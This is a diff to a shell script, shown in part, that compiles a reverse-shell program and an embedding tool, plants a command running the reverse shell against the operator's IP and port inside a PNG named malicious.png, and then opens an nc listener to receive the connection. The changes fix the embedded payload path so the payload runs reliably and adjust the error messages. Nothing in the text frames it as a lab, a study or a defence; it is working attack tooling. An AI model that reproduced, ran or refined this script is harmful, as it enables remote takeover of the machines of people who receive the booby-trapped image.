@@ -25,17 +25,18 @@ gcc reverse_shell.c -o reverse_shell
 if [ $? -ne 0 ]; then echo "[!] Error compiling reverse_shell.c"; exit 1; fi
 
 gcc embed_payload.c -o embed_payload -lpng
-if [ $? -ne 0 ]; then echo "[!] Error compiling embed_payload.c. Is libpng-dev installed?"; exit 1; fi
+if [ $? -ne 0 ]; then echo "[!] Error compiling embed_payload.c"; exit 1; fi
 
-# 5. Execution & Embedding
+# 5. Execution & Embedding (FIXED LINE BELOW)
 echo "[*] Creating malicious.png for IP: $MY_IP"
-./embed_payload benign.png malicious.png "./reverse_shell $MY_IP $MY_PORT"
+./embed_payload benign.png malicious.png "$PWD/reverse_shell $MY_IP $MY_PORT"
 
+# 6. Final Check and Listener
 if [ -f "malicious.png" ]; then
     echo "[+] SUCCESS: malicious.png created."
     echo "[*] Starting listener on port $MY_PORT..."
     echo "[*] (Press CTRL+C to stop when finished)"
     nc -lvnp $MY_PORT
 else
-    echo "[!] ERROR: Failed to create malicious.png. Check your C code."
+    echo "[!] ERROR: Failed to create malicious.png. Check file permissions."
 fi
